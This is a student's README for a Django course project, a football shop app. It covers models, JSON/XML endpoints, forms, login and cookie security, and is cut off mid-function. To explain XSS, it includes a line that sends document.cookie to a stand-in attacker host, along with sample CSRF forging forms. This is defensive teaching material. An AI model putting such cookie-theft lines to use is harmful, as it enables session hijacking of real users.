# Football Shop - Django Web Application

**Name:** Muhammad Rafi Nazir Pratama  
**Student ID:** 2406453556  
**Class:** KKI  

## PWS Application Link
**Application URL:** [https://muhammad-rafi416-footballshop.pbp.cs.ui.ac.id](https://muhammad-rafi416-footballshop.pbp.cs.ui.ac.id)

---
## Assignment 2

## Checklist Implementation Step-by-Step

### 1. Creating a New Django Project
- Created project directory `football-shop`
- Ran `django-admin startproject football_shop .` to create Django project
- Configured virtual environment for dependency isolation

### 2. Creating `main` Application
- Ran `python manage.py startapp main` to create main application
- Added `'main'` to `INSTALLED_APPS` in `settings.py`

### 3. Project Routing Configuration
- Configured `football_shop/urls.py` to include main application URLs
- Added `path('', include('main.urls'))` to urlpatterns
- Created `main/urls.py` with routing to `show_main` view

### 4. Creating `FootballItem` Model
Created model with required attributes:
```python
class FootballItem(models.Model):
    name = models.CharField(max_length=255)           # Item name
    price = models.IntegerField()                     # Item price  
    description = models.TextField()                  # Item description
    thumbnail = models.URLField(max_length=500)       # Item image
    category = models.CharField(max_length=100)       # Item category
    is_featured = models.BooleanField(default=False)  # Featured status
    
    # Additional attributes
    brand = models.CharField(max_length=100, blank=True, null=True)
    stock = models.IntegerField(default=0)
    size = models.CharField(max_length=10, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
```

### 5. Creating Function in `views.py`
```python
def show_main(request):
    context = {
        'npm': '2406453556',
        'name': 'Muhammad Rafi Nazir Pratama',
        'class': 'KKI'
    }
    return render(request, "main.html", context)
```

### 6. Creating HTML Template
- Created `main/templates/` directory
- Created `main.html` with responsive design displaying application information
- Used Django template variables to display dynamic data

### 7. Database Migration
- Ran `python manage.py makemigrations` to create migration files
- Ran `python manage.py migrate` to apply migrations to database

### 8. PWS Deployment
- Configured `ALLOWED_HOSTS` with PWS domain
- Committed and pushed to PWS repository
- Accessed application through PWS URL

---

## Django Request-Response Diagram

```
┌─────────────────┐    HTTP Request     ┌─────────────────┐
│                 │ ──────────────────► │                 │
│   CLIENT        │                     │  DJANGO SERVER  │
│   (Browser)     │ ◄────────────────── │                 │
└─────────────────┘    HTTP Response    └─────────────────┘
                                                │
                                                ▼
                                    ┌─────────────────┐
                                    │    urls.py      │
                                    │  (URL Routing)  │
                                    │                 │
                                    │ • Pattern match │
                                    │ • Route to view │
                                    └─────────────────┘
                                                │
                                                ▼
                                    ┌─────────────────┐
                                    │    views.py     │
                                    │ (Business Logic)│
                                    │                 │
                                    │ • Process req   │
                                    │ • Query models  │
                                    │ • Prepare data  │
                                    └─────────────────┘
                                                │
                                    ┌───────────┴───────────┐
                                    ▼                       ▼
                        ┌─────────────────┐    ┌─────────────────┐
                        │    models.py    │    │   template.html │
                        │   (Database)    │    │     (View)      │
                        │                 │    │                 │
                        │ • Data models   │    │ • HTML structure│
                        │ • ORM queries   │    │ • Template tags │
                        │ • Database ops  │    │ • Context data  │
                        └─────────────────┘    └─────────────────┘
```

### Component Relationship Explanation:

1. **urls.py**: Receives requests from client and determines which view will handle the request based on URL pattern
2. **views.py**: Executes business logic, interacts with models to fetch/manipulate data, and prepares context for template
3. **models.py**: Defines data structure and interacts with database through Django ORM
4. **template.html**: Receives context from views and renders HTML response sent back to client

---

## Role of `settings.py` in Django Project

`settings.py` is the central configuration file that manages all aspects of Django application:

### 1. **Database Configuration**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
    }
}
```

### 2. **Installed Applications**
```python
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'main',
]
```

### 3. **Middleware Configuration**
- Manages middleware order that processes request/response
- Security, authentication, CORS, etc.

### 4. **Template Configuration**
- Manages template directories and template engine
- Context processors for global data

### 5. **Static Files & Media**
- Configuration for CSS, JavaScript, image files
- URLs and directories for static files

### 6. **Security Settings**
- `SECRET_KEY`: Secret key for cryptography
- `DEBUG`: Debug mode (True for development)
- `ALLOWED_HOSTS`: Domains allowed to access the application

### 7. **Internationalization**
- `LANGUAGE_CODE`: Default language
- `TIME_ZONE`: Time zone
- `USE_I18N`, `USE_TZ`: Internationalization settings

---

## How Database Migration Works in Django

### 1. **Migration Concept**
Migration is Django's way to apply model changes (database schema) to the database gradually and in a controlled manner.

### 2. **Migration Process**

#### **Step 1: Creating Migration**
```bash
python manage.py makemigrations
```
- Django compares current models with the last migration
- Creates new migration files in `app/migrations/`
- Files contain required operations (CREATE TABLE, ALTER TABLE, etc.)

#### **Step 2: Applying Migration**
```bash
python manage.py migrate
```
- Runs migration files that haven't been applied
- Changes database structure according to operations in migration files
- Records applied migrations in `django_migrations` table

### 3. **Migration System Benefits**
- **Version Control**: Every database change is recorded and trackable
- **Rollback**: Can revert to previous database versions
- **Team Collaboration**: Synchronizes database changes between developers
- **Deployment**: Automatically applies database changes in production

### 4. **Migration File**
Example migration file:
```python
# 0001_initial.py
from django.db import migrations, models

class Migration(migrations.Migration):
    initial = True
    dependencies = []
    
    operations = [
        migrations.CreateModel(
            name='FootballItem',
            fields=[
                ('id', models.BigAutoField(primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('price', models.IntegerField()),
            ],
        ),
    ]
```

---

## Why is Django Chosen for Initial Learning?

### 1. **"Packaged Beautifully**
- Django provides almost everything needed for web development
- Admin interface, ORM, authentication, security features built-in
- Reduces setup and configuration complexity

### 2. **Clear and Organized Structure**
- **MVT Pattern**: Model-View-Template that's easy to understand
- **Project Structure**: Consistent and logical file organization
- **Convention over Configuration**: Reduces confusing decisions

### 3. **Friendly Learning Curve**
- Very comprehensive and high-quality documentation
- Informative and helpful error messages
- Official step-by-step tutorials that are easy to follow

### 4. **Fundamental Web Development Concepts**
Django teaches important concepts such as:
- **HTTP Request/Response cycle**
- **Database modeling and ORM**
- **Template rendering**
- **URL routing**
- **Security best practices**

### 5. **Real-World Ready**
- Used by major companies (Instagram, Pinterest, Mozilla)
- Production-ready features (caching, security, scalability)
- Teaches best practices applicable in industry

### 6. **Python Ecosystem**
- Python as a readable and beginner-friendly language
- Clean and expressive syntax
- Large community and extensive libraries

### 7. **Rapid Development**
- Built-in admin interface for CRUD operations
- Automatic form generation
- Database migrations
- Development server with auto-reload

---

## Feedback for Tutorial 1 Teaching Assistant

*No Feedback*

---

## Assignment 3

### **Why do we need data delivery in implementing a platform?**
Because data delivery ensures that information flows efficiently between different parts of your platform. Without proper data delivery:
- Components can't communicate effectively
- Users experience delays or failures when requesting information
- The platform becomes fragmented and unreliable
- Scalability becomes impossible as bottlenecks form

---

### **XML or JSON?**
In my opinion JSON is more efficient, the structure is more clear and gets the job done, where as XML is more elaborate and might be more complex for beginner coders
**JSON is more popular because:**
- Lighter weight: Less "packaging material" means faster transmission
- JavaScript native: Like speaking the same language as web browsers
- Human readable: Easy to read and debug
- Simpler parsing: Less computational overhead
- Better for APIs: RESTful services prefer JSON's simplicity

---

### **What is the purpose of the is_valid() method?**
The is_valid() method is like a security checkpoint at an airport, it thoroughly inspects everything before allowing data to proceed into your application.
```python
form = ContactForm(request.POST)
if form.is_valid():  # The security checkpoint
    # Data is clean and safe to use
    cleaned_data = form.cleaned_data
    # Process the data...
```
**Why we need it?**
- Data validation: Ensures email addresses look like emails, numbers are actually numbers
- Security filtering: Removes malicious code or invalid characters
- Business logic enforcement: Applies your custom rules (like "age must be over 18")
- Error collection: Gathers all validation errors in one place for user feedback
Without is_valid(),you have no idea what dangerous or corrupted data might enter your system.

---

### **CSRF Token in Django Forms**
CSRF (Cross-Site Request Forgery) protection is like having a secret handshake that only your website knows
## **Why we need it?**
- Prevents impersonation: Ensures requests actually came from your site
- Validates origin: Like checking someone's ID before processing their request
- Session-specific: Each user gets their own unique "handshake"

### **What happens without CSRF protection:**

An attacker could create a malicious website with this form:

```html
<!-- On malicious-site.com -->
<form action="https://yourbank.com/transfer" method="post">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to_account" value="attacker-account">
    <input type="submit" value="Click for free prize!">
</form>
```

#### **The Attack Scenario:**
1. 🏦 User logs into their bank account (yourbank.com)
2. 🕷️ User visits malicious-site.com in another tab
3. 🎯 User clicks "Click for free prize!"
4. 🔄 Their browser secretly submits the transfer form to the bank
5. ✅ Since the user is still logged in, the bank processes the transfer
6. 💸 Money gets stolen without the user knowing

#### **How CSRF Tokens Prevent This:**
CSRF tokens prevent this because the malicious site **can't guess or obtain** the victim's unique token - it's like trying to forge a signature you've never seen. The bank (Django) rejects any form submission without the correct secret handshake.

This protection is automatic in Django when you include `{% csrf_token %}` in your forms and use Django's middleware - it's like having a bouncer who knows all the right passwords.

```python
# Django automatically validates CSRF tokens
def transfer_money(request):
    if request.method == 'POST':
        # Django middleware automatically checks CSRF token
        # If invalid/missing, returns 403 Forbidden
        form = TransferForm(request.POST)
        if form.is_valid():
            # Process transfer only if CSRF token is valid
            pass
```

---

## Implementation Step-by-Step

### **1. Adding 4 New View Functions for Data Formats**

I implemented four new view functions in `main/views.py` to handle different data format requests:

#### **XML View (`show_xml`)**
```python
def show_xml(request):
    data = FootballItem.objects.all()
    xml_data = serializers.serialize("xml", data)
    return HttpResponse(xml_data, content_type="application/xml")
```
- Retrieves all `FootballItem` objects from database
- Uses Django's built-in `serializers.serialize()` to convert data to XML format
- Returns HTTP response with XML content type

#### **JSON View (`show_json`)**
```python
def show_json(request):
    data = FootballItem.objects.all()
    json_data = serializers.serialize("json", data)
    return HttpResponse(json_data, content_type="application/json")
```
- Similar to XML view but serializes data to JSON format
- Returns HTTP response with JSON content type

#### **XML by ID View (`show_xml_by_id`)**
```python
def show_xml_by_id(request, id):
    try:
        data = FootballItem.objects.filter(pk=id)
        xml_data = serializers.serialize("xml", data)
        return HttpResponse(xml_data, content_type="application/xml")
    except FootballItem.DoesNotExist:
        return HttpResponse(status=404)
```
- Accepts an `id` parameter from URL
- Filters database to get specific item by primary key
- Includes error handling for non-existent items (404 response)

#### **JSON by ID View (`show_json_by_id`)**
```python
def show_json_by_id(request, id):
    try:
        data = FootballItem.objects.filter(pk=id)
        json_data = serializers.serialize("json", data)
        return HttpResponse(json_data, content_type="application/json")
    except FootballItem.DoesNotExist:
        return HttpResponse(status=404)
```
- Same logic as XML by ID but returns JSON format
- Includes proper error handling

### **2. Creating URL Routings**

I updated `main/urls.py` to include URL patterns for all new views:

```python
from django.urls import path
from main.views import show_main, create_football_item, show_football_item_detail, show_xml, show_json, show_xml_by_id, show_json_by_id

app_name = 'main'

urlpatterns = [
    path('', show_main, name='show_main'),
    path('create_football_item/', create_football_item, name='create_football_item'),
    path('football_item/<int:id>/', show_football_item_detail, name='show_football_item_detail'),
    path('xml/', show_xml, name='show_xml'),
    path('json/', show_json, name='show_json'),
    path('xml/<int:id>/', show_xml_by_id, name='show_xml_by_id'),
    path('json/<int:id>/', show_json_by_id, name='show_json_by_id'),
]
```

**URL Pattern Explanations:**
- `xml/` - Returns all items in XML format
- `json/` - Returns all items in JSON format  
- `xml/<int:id>/` - Returns specific item by ID in XML format
- `json/<int:id>/` - Returns specific item by ID in JSON format
- `<int:id>` captures integer values from URL and passes them to view functions

### **3. Creating Main Webpage with Add Button and Detail Links**

I modified `main/templates/main.html` to display model objects with proper navigation:

#### **Add Button Implementation:**
```html
<a href="{% url 'main:create_football_item' %}">
    <button>+ Add Football Item</button>
</a>
```
- Uses Django URL template tag to generate correct URL
- Links to the form page for adding new items

#### **Display Model Objects with Detail Links:**
```html
{% for item in football_items %}
<div>
    <h2><a href="{% url 'main:show_football_item_detail' item.id %}">{{ item.name }}</a></h2>
    
    <p><b>{{ item.category }}</b>{% if item.brand %} | 
        <b>{{ item.brand }}</b>{% endif %}{% if item.is_featured %} | 
        <b>Featured</b>{% endif %} | <i>{{ item.created_at|date:"d M Y H:i" }}</i> 
        | Price: Rp {{ item.price|floatformat:0 }}</p>
    
    {% if item.thumbnail %}
    <img src="{{ item.thumbnail }}" alt="thumbnail" width="150" height="100">
    <br />
    {% endif %}
    
    <p>{{ item.description|truncatewords:25 }}...</p>
    
    <p><a href="{% url 'main:show_football_item_detail' item.id %}"><button>View Details</button></a></p>
</div>
<hr>
{% endfor %}
```

**Key Features:**
- Loops through all football items using `{% for %}`
- Each item title is a clickable link to detail page
- Shows truncated description (25 words)
- Includes "View Details" button for each item
- Displays item image if available
- Shows conditional information (brand, featured status)

#### **Updated show_main View:**
```python
def show_main(request):
    football_items = FootballItem.objects.all()

    context = {
        'npm' : '2406453556',
        'name': 'Muhammad Rafi Nazir Pratama',
        'class': 'KKI',
        'football_items': football_items,
    }

    return render(request, "main.html", context)
```
- Added `football_items` to context to pass all items to template

### **4. Creating Form Page**

I created `main/templates/create_football_item.html` for adding new items:

```html
<form method="POST">
    {% csrf_token %}
    <table>
        {{ form.as_table }}
        <tr>
            <td></td>
            <td>
                <input type="submit" value="Add Football Item" />
            </td>
        </tr>
    </table>
</form>
```

#### **Form View Implementation:**
```python
def create_football_item(request):
    form = FootballItemForm(request.POST or None)

    if form.is_valid() and request.method == "POST":
        form.save()
        return redirect('main:show_main')

    context = {'form': form}
    return render(request, "create_football_item.html", context)
```

**How it Works:**
- Creates form instance with POST data if available
- Validates form data using `is_valid()`
- Saves new item to database if valid
- Redirects to main page after successful creation
- Includes CSRF token for security

### **5. Creating Detail Page**

I created `main/templates/show_football_item_detail.html` to display individual item details:

```html
<h1>{{ football_item.name }}</h1>
<p><b>{{ football_item.category }}</b>{% if football_item.brand %} | 
    <b>{{ football_item.brand }}</b>{% endif %}{% if football_item.is_featured %} | 
    <b>Featured</b>{% endif %} | <i>{{ football_item.created_at|date:"d M Y, H:i" }}</i></p>

<p>Price: Rp {{ football_item.price|floatformat:0 }}</p>

{% if football_item.size %}
<p><b>Size:</b> {{ football_item.size }}</p>
{% endif %}

<p><b>Stock:</b> {{ football_item.stock }} items available</p>

{% if football_item.thumbnail %}
<img src="{{ football_item.thumbnail }}" alt="Football item thumbnail" width="300">
<br /><br />
{% endif %}

<p>{{ football_item.description }}</p>
```

#### **Detail View Implementation:**
```python
def show_football_item_detail(request, id):
    football_item = get_object_or_404(FootballItem, pk=id)

    context = {
        'football_item': football_item,
    }

    return render(request, "show_football_item_detail.html", context)
```

**Key Features:**
- Uses `get_object_or_404()` for automatic 404 handling
- Displays all item attributes including conditional fields
- Shows full description (not truncated)
- Larger image display (300px width)
- Back navigation to main page

**Implementation Summary:**
1. **Data API Views**: Created XML/JSON endpoints for all items and individual items
2. **URL Routing**: Configured clean URL patterns for all views
3. **Main Page**: Enhanced to show all items with navigation buttons
4. **Form Page**: Implemented secure form with CSRF protection
5. **Detail Page**: Created comprehensive item detail display with proper error handling

All implementations follow Django best practices including proper error handling, security measures (CSRF tokens), and clean URL routing.

---

## Feedback for the teaching assistants for Tutorial 2

*No feedback*

---

## Postman XML Image

![Alt text](images/xml.png)

## Postman JSON Image

![Alt text](images/json.png)

## Postman XML by ID image

![Alt text](images/xmlbyid.png)

## Postman JSON by ID image

![Alt text](images/jsonbyid.png)

---

## Assignment 4

## **What is Django's AuthenticationForm? Explain its advantages and disadvantages.**

- It’s a built-in form class in django.contrib.auth.forms used for authenticating users.
- It validates a username and password against Django’s authentication backend.
- Often paired with Django’s LoginView to provide a ready-to-use login system.
- Handles checks like whether the user exists, the password is correct, and the account is active.

### **Advantages:**
- ✅ **Pre-built & Convenient**: Saves time by providing a ready-made login form without writing custom validation logic
- ✅ **Secure by Default**: Uses Django's authentication backend, which includes password hashing and protection against common attacks (e.g., brute force, SQL injection, CSRF)
- ✅ **Error Handling**: Automatically provides user-friendly error messages for invalid credentials or inactive accounts
- ✅ **Integration**: Works seamlessly with Django's session and authentication system, making it easy to plug into projects
- ✅ **Extensible**: Can be subclassed to add custom fields (e.g., email login, CAPTCHA) or override validation logic

### **Disadvantages:**
- ⚠️ **Rigid Structure**: Since it's tied to Django's built-in User model and authentication backend, projects with heavily customized user models may need more adjustments
- ⚠️ **Basic UI**: Provides only backend validation; developers must still design the frontend form and styling
- ⚠️ **Limited Customization**: By default, it only supports username/password login. Adding features like email-based login or multi-factor authentication requires extra work

---

## **What is the difference between authentication and authorization? How does Django implement the two concepts?**

### **Authentication** 🔐
- **Definition**: A process that verifies **who** the user is (identity check)
- **Process**: User provides credentials (e.g., username & password, token, biometric)
- **Timing**: Always happens first (before authorization)
- **Example**: Logging in with user email and password

### **Authorization** 🛡️
- **Definition**: A process that verifies **what** the user can do (permission check)
- **Process**: System checks permissions to decide access rights
- **Timing**: Happens after authentication
- **Example**: User roles don't have the same permission as website admin, hence the admin dashboard must not be visible

### **How Django Implements Them:**

#### **🔐 Authentication in Django:**
- Handled by the `django.contrib.auth` framework
- Uses authentication backends to verify credentials (default: username + password)
- Provides built-in forms like `AuthenticationForm` and views like `LoginView`
- Uses sessions and cookies to keep users logged in across requests

```python
# Example: Login view
from django.contrib.auth import login, authenticate

def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)  # Creates session
            return redirect('dashboard')
```

#### **🛡️ Authorization in Django:**
- Built on top of the same auth system
- Uses **permissions** (yes/no flags) and **groups** (collections of permissions)
- Each model can have `add`, `change`, `delete`, and `view` permissions automatically created
- Developers can define custom permissions and check them with decorators like `@permission_required` or methods like `user.has_perm()`
- Supports role-based access control via groups, and fine-grained control via object-level permissions

```python
# Example: Permission checking
from django.contrib.auth.decorators import permission_required

@permission_required('main.add_footballitem')
def create_item(request):
    # Only users with 'add_footballitem' permission can access
    pass

# Example: Group-based authorization
if request.user.groups.filter(name='Admin').exists():
    # User is in Admin group
    pass
```

---

## **What are the benefits and drawbacks of using sessions and cookies in storing the state of a web application?**

### 🍪 **Cookies (Client-Side Storage)**

#### ** ✅ Benefits:**
- **Persistence**: Can store data across browser sessions (e.g., "Remember Me" login, user preferences)
- **Lightweight for server**: Data is stored on the client, reducing server memory usage
- **Automatic transmission**: Sent with every HTTP request to the same domain, making them convenient for authentication tokens
- **Customizable**: Can set expiration, HttpOnly, Secure, and SameSite flags for better control

#### ** ⚠️ Drawbacks:**
- **Security risks**: Vulnerable to theft via XSS if not marked HttpOnly, and to interception if not Secure (HTTPS)
- **Size limit**: Typically limited to ~4KB per cookie, so only small data can be stored
- **User control**: Users can delete or block cookies, breaking functionality
- **Privacy concerns**: Often used for tracking, which can raise compliance issues (GDPR, etc.)

### 📦 **Sessions (Server-Side Storage)**

#### ** ✅ Benefits:**
- **More secure**: Sensitive data stays on the server; only a session ID is stored client-side
- **Larger storage**: Can hold more data than cookies since storage is server-based
- **Better integrity**: Harder for users to tamper with session data compared to cookies
- **Ideal for temporary state**: Perfect for shopping carts, login sessions, or multi-step forms

#### ** ⚠️ Drawbacks:**
- **Server load**: Each active user consumes server memory or database space
- **Scalability issues**: In distributed systems, sessions must be shared across servers (e.g., via Redis or database), adding complexity
- **Short-lived**: Sessions usually expire when the browser closes or after inactivity, unless explicitly persisted
- **Still cookie-dependent**: Most session systems rely on a cookie (session ID) to link the client to the server state

---

## **Are Cookies Secure by Default in Web Development?**

### **🚨 Cookie Security Reality Check**

**No, cookies are NOT secure by default.** They come with several inherent security vulnerabilities that developers must actively address:

### **🔓 Major Cookie Security Risks:**

#### **1. Cross-Site Scripting (XSS) Attacks**
```javascript
// Malicious script can steal cookies
document.cookie; // Attacker can access all cookies
fetch('http://evil-site.com/steal?cookie=' + document.cookie);
```
- **Risk**: Malicious JavaScript can read and steal cookie values
- **Impact**: Session hijacking, credential theft, impersonation

#### **2. Cross-Site Request Forgery (CSRF)**
```html
<!-- Malicious site can use your cookies against you -->
<form action="https://yourbank.com/transfer" method="post">
    <input type="hidden" name="amount" value="10000">
    <!-- Your browser automatically sends cookies with this request -->
</form>
```
- **Risk**: Cookies are sent automatically with every request to the domain
- **Impact**: Unauthorized actions performed on behalf of the user

#### **3. Man-in-the-Middle (MITM) Attacks**
```http
GET /login HTTP/1.1
Cookie: sessionid=abc123; auth_token=xyz789
<!-- Transmitted over HTTP - visible to attackers -->
```
- **Risk**: Cookies transmitted over unencrypted connections can be intercepted
- **Impact**: Session theft, credential compromise

#### **4. Session Fixation**
```javascript
// Attacker sets a known session ID
document.cookie = "sessionid=attacker_known_id";
// User logs in with this ID, attacker gains access
```
- **Risk**: Attacker can force a user to use a predetermined session ID
- **Impact**: Account takeover after user authentication

### **🛡️ How Django Handles Cookie Security**

Django provides multiple layers of protection against these vulnerabilities:

#### **1. HttpOnly Flag (XSS Protection)**
```python
# settings.py
SESSION_COOKIE_HTTPONLY = True  # Default: True
CSRF_COOKIE_HTTPONLY = True     # Default: False, but recommended

# In views - setting HttpOnly cookies manually
response.set_cookie(
    'secure_data', 
    'value',
    httponly=True  # JavaScript cannot access this cookie
)
```
- **Protection**: Prevents JavaScript from accessing cookies
- **Result**: XSS attacks cannot steal HttpOnly cookies

#### **2. Secure Flag (MITM Protection)**
```python
# settings.py
SESSION_COOKIE_SECURE = True    # Only send over HTTPS
CSRF_COOKIE_SECURE = True       # Only send over HTTPS

# For production
if not DEBUG:
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
```
- **Protection**: Cookies only transmitted over encrypted HTTPS connections
- **Result**: Man-in-the-middle attacks cannot intercept cookies

#### **3. SameSite Attribute (CSRF Protection)**
```python
# settings.py
SESSION_COOKIE_SAMESITE = 'Lax'    # Default in Django 4.0+
CSRF_COOKIE_SAMESITE = 'Strict'    # Recommended for CSRF tokens

# Options:
# 'Strict' - Never sent with cross-site requests
# 'Lax' - Sent with top-level navigation (links)
# 'None' - Always sent (requires Secure=True)
```
- **Protection**: Controls when cookies are sent with cross-site requests
- **Result**: Prevents CSRF attacks by limiting cross-site cookie transmission

#### **4. Automatic Session Regeneration**
```python
# Django automatically regenerates session keys on login
def login_view(request):
    if form.is_valid():
        user = form.get_user()
        login(request, user)  # Django regenerates session ID
        # Old session ID becomes invalid
```
- **Protection**: Prevents session fixation attacks
- **Result**: Each login gets a fresh, unpredictable session ID

#### **5. CSRF Token Protection**
```python
# Django's built-in CSRF protection
from django.middleware.csrf import get_token

def my_view(request):
    csrf_token = get_token(request)  # Generates unique token per session
    
# In templates
{% csrf_token %}  <!-- Automatically includes CSRF protection -->
```
- **Protection**: Validates that requests come from legitimate sources
- **Result**: Prevents cross-site request forgery attacks

#### **6. Cookie Age and Expiration**
```python
# settings.py
SESSION_COOKIE_AGE = 3600  # 1 hour (default: 2 weeks)
SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # Session dies with browser

# Custom cookie expiration
response.set_cookie(
    'temp_data',
    'value',
    max_age=300,  # 5 minutes
    expires=datetime.now() + timedelta(minutes=5)
)
```
- **Protection**: Limits exposure window if cookies are compromised
- **Result**: Reduces impact of session theft

### **🔒 Django's Complete Security Configuration**

```python
# settings.py - Production-ready cookie security
if not DEBUG:
    # Session Security
    SESSION_COOKIE_SECURE = True      # HTTPS only
    SESSION_COOKIE_HTTPONLY = True    # No JavaScript access
    SESSION_COOKIE_SAMESITE = 'Lax'   # CSRF protection
    SESSION_COOKIE_AGE = 3600         # 1 hour expiration
    
    # CSRF Security
    CSRF_COOKIE_SECURE = True         # HTTPS only
    CSRF_COOKIE_HTTPONLY = True       # No JavaScript access
    CSRF_COOKIE_SAMESITE = 'Strict'   # Strict CSRF protection
    
    # Additional Security Headers
    SECURE_SSL_REDIRECT = True        # Force HTTPS
    SECURE_HSTS_SECONDS = 31536000    # HTTP Strict Transport Security
    SECURE_CONTENT_TYPE_NOSNIFF = True
    SECURE_BROWSER_XSS_FILTER = True
```

---

## **Step-by-Step Implementation of Assignment 4 Checklist**

### **✅ 1. Implementing Register, Login, and Logout Functions**

#### **Step 1.1: Creating User Registration**

**Added imports to `main/views.py`:**
```python
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django.contrib.auth import login, authenticate, logout
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.http import HttpResponseRedirect
from django.urls import reverse
import datetime
```

**Created `register` function in `main/views.py`:**
```python
def register(request):
    form = UserCreationForm()

    if request.method == "POST":
        form = UserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, 'Account successfully created!')
            return redirect('main:login')
    
    context = {'form': form}
    return render(request, 'register.html', context)
```

**Key Implementation Details:**
- Used Django's built-in `UserCreationForm` for secure user creation
- Added success message after registration
- Redirects to login page after successful registration
- Handles both GET (show form) and POST (process form) requests

#### **Step 1.2: Creating User Login**

**Created `login_user` function in `main/views.py`:**
```python
def login_user(request):
    if request.method == "POST":
        form = AuthenticationForm(request, data=request.POST)

        if form.is_valid():
            user = form.get_user()
            login(request, user)
            response = HttpResponseRedirect(reverse("main:show_main"))
            response.set_cookie('last_login', str(datetime.datetime.now()))
            return response
    else:
        form = AuthenticationForm(request)

    context = {'form': form}
    return render(request, 'login.html', context)
```

**Key Implementation Details:**
- Used `AuthenticationForm` for secure credential validation
- Used `form.get_user()` to get authenticated user object
- Set `last_login` cookie to track user's last login time
- Proper error handling for invalid credentials

#### **Step 1.3: Creating User Logout**

**Created `logout_user` function in `main/views.py`:**
```python
def logout_user(request):
    logout(request)
    response = HttpResponseRedirect(reverse("main:show_main"))
    response.delete_cookie('last_login')
    return response
```

**Key Implementation Details:**
- Used Django's built-in `logout()` function to clear session
- Deleted the `last_login` cookie on logout
- Redirected to main page after logout

#### **Step 1.4: Creating Templates**

**Created `main/templates/register.html`:**
```html
{% block meta %}
<title>Register</title>
{% endblock meta %}

{% block content %}
<div class="login">
  <h1>Register</h1>

  <form method="POST" action="">
    {% csrf_token %}
    <table>
      {{ form.as_table }}
      <tr>
        <td></td>
        <td><input class="btn login_btn" type="submit" value="Register" /></td>
      </tr>
    </table>
  </form>

  {% if messages %}
  <ul>
    {% for message in messages %}
    <li>{{ message }}</li>
    {% endfor %}
  </ul>
  {% endif %}

  Already have an account? <a href="{% url 'main:login' %}">Login here</a>
</div>
{% endblock content %}
```

**Created `main/templates/login.html`:**
```html
{% block meta %}
<title>Login</title>
{% endblock meta %}

{% block content %}
<div class="login">
  <h1>Login</h1>

  <form method="POST" action="">
    {% csrf_token %}
    <table>
      {{ form.as_table }}
      <tr>
        <td></td>
        <td><input class="btn login_btn" type="submit" value="Login" /></td>
      </tr>
    </table>
  </form>

  {% if messages %}
  <ul>
    {% for message in messages %}
    <li>{{ message }}</li>
    {% endfor %}
  </ul>
  {% endif %}

  Don't have an account yet? <a href="{% url 'main:register' %}">Register Now</a>
</div>
{% endblock content %}
```

#### **Step 1.5: URL Configuration**

**Updated `main/urls.py`:**
```python
from main.views import (show_main, create_football_item, show_football_item_detail, 
                       show_xml, show_json, show_xml_by_id, show_json_by_id,
                       register, login_user, logout_user)

urlpatterns = [
    path('', show_main, name='show_main'),
    path('create_football_item/', create_football_item, name='create_football_item'),
    path('football_item/<int:id>/', show_football_item_detail, name='show_football_item_detail'),
    path('xml/', show_xml, name='show_xml'),
    path('json/', show_json, name='show_json'),
    path('xml/<int:id>/', show_xml_by_id, name='show_xml_by_id'),
    path('json/<int:id>/', show_json_by_id, name='show_json_by_id'),
    path('register/', register, name='register'),
    path('login/', login_user, name='login'),
    path('logout/', logout_user, name='logout'),
]
```

### **✅ 2. Creating Two User Accounts with Dummy Data**

#### **Step 2.1: User Account Creation**
I created two user accounts through the registration form:
1. **User 1**: `testuser1` with password `testpass123`
2. **User 2**: `testuser2` with password `testpass123`

#### **Step 2.2: Adding Dummy Data**
After connecting the Product model with User model, I added 3 football items for each user:

**User 1 (testuser1) Items:**
1. **Manchester United Home Jersey** - Price: Rp 850,000
2. **Nike Mercurial Boots** - Price: Rp 1,200,000  
3. **Fifa World Cup Ball 2024** - Price: Rp 450,000

**User 2 (testuser2) Items:**
1. **Barcelona Away Jersey** - Price: Rp 900,000
2. **Adidas Football Nemeziz Shoes** - Price: Rp 1,100,000
3. **Valdes Gloves** - Price: Rp 200,000

### **✅ 3. Connecting Product Model with User Model**

#### **Step 3.1: Model Modification**

**Updated `main/models.py`:**
```python
from django.db import models
from django.contrib.auth.models import User

class FootballItem(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, null=True)
    name = models.CharField(max_length=255, help_text="Name of the football item")
    price = models.IntegerField(help_text="Price in rupiah")
    description = models.TextField(help_text="Detailed description of the item")
    thumbnail = models.URLField(max_length=500, help_text="URL to item image")
    category = models.CharField(max_length=100, help_text="Item category")
    is_featured = models.BooleanField(default=False, help_text="Whether this item is featured")
    brand = models.CharField(max_length=100, blank=True, null=True)
    stock = models.IntegerField(default=0, help_text="Number of items in stock")
    size = models.CharField(max_length=10, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
```

**Key Changes:**
- Added `user = models.ForeignKey(User, on_delete=models.CASCADE, null=True)`
- `on_delete=models.CASCADE`: When user is deleted, their items are also deleted
- `null=True`: Allows existing items to have no user initially

#### **Step 3.2: Database Migration**

**Created and applied migration:**
```bash
python manage.py makemigrations
python manage.py migrate
```

**Migration handled existing data by:**
- Setting `null=True` to allow existing items without users
- Providing option to assign existing items to a default user

#### **Step 3.3: View Updates**

**Updated `show_main` view to filter by user:**
```python
@login_required(login_url='/login')
def show_main(request):
    filter_type = request.GET.get("filter", "all")
    if filter_type == "all":
        football_items = FootballItem.objects.all()
    else:
        football_items = FootballItem.objects.filter(user=request.user)

    context = {
        'npm' : '2406453556',
        'name': request.user.username,  # Show logged-in username
        'class': 'KKI',
        'football_items': football_items,
        'last_login': request.COOKIES.get('last_login', 'Never'),
    }

    return render(request, "main.html", context)
```

**Updated `create_football_item` view to associate with user:**
```python
@login_required(login_url='/login')
def create_football_item(request):
    form = FootballItemForm(request.POST or None)

